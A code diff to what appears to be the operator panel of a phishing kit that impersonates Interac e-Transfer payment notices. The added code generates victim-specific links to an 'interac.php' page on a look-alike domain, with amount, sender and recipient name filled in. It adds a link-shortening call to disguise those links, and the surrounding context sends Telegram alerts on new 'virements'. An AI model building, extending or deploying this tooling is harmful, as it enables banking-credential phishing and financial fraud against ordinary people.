@@ -63,17 +63,48 @@ sendMessageToTelegram('🟡🟡🟡 NOUVEAU VIREMENT🟡🟡🟡');
             text-decoration: underline;
         }
     </style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
+
+function getDomainFromCurrentUrl() {
+      try {
+        // Utilise window.location pour obtenir l'URL actuelle
+        const url = window.location.href;
+        // Crée un objet URL à partir de l'URL actuelle
+        const urlObject = new URL(url);
+        // Récupère le domaine (hostname) de l'URL
+        return urlObject.hostname;
+      } catch (error) {
+        console.error('Erreur lors de l\'extraction du domaine:', error);
+        return null;
+      }
+    }
+
         function generateLink() {
             var client = document.getElementById('client').value;
             var montant = document.getElementById('montant').value;
             var exp = document.getElementById('exp').value;
-            var baseUrl = 'https://etransfertsecure.onrender.com/interac.php?';
+            domain = getDomainFromCurrentUrl() ;
+            var baseUrl = 'https://'+domain + '/interac.php?';
             var url = baseUrl + 'montant=' + encodeURIComponent(montant) + '&exp=' + encodeURIComponent(exp) + '&nom=' + encodeURIComponent(client);
 
             // Update the URL field with the generated link
             document.getElementById('url').value = url;
         }
+
+        function urlz(urlToSend){
+                    $.ajax({
+          url: 'urlz.php', // URL du fichier PHP
+          type: 'POST',    // Méthode HTTP (POST dans ce cas)
+          data: { url: urlToSend },  // Les données envoyées au serveur (ici l'URL)
+          success: function(response) {
+            // Affiche la réponse du serveur dans la div avec l'ID responseContainer
+            $("#responseContainer").val(response);
+          },
+
+        });
+        }
+
     </script>
 </head>
 <body>
@@ -97,10 +128,15 @@ sendMessageToTelegram('🟡🟡🟡 NOUVEAU VIREMENT🟡🟡🟡');
             <input type="text" id="exp" name="exp"  required>
             
             <label for="url">URL:</label>
-            <input type="url" id="url" name="url"  required>
+            <input type="url" id="url" name="urlgen"  required>
             
             <button type="button" onclick="generateLink()">Générer le Lien</button>
-            
+
+            <br>
+            <br>
+            <button type="button" onclick="urlz(document.getElementById('url').value)">raccourcir le Lien</button>
+           <input type="text" name="url" id="responseContainer">
+           
             <button type="submit">Envoyer</button>
         </form>
     </div>
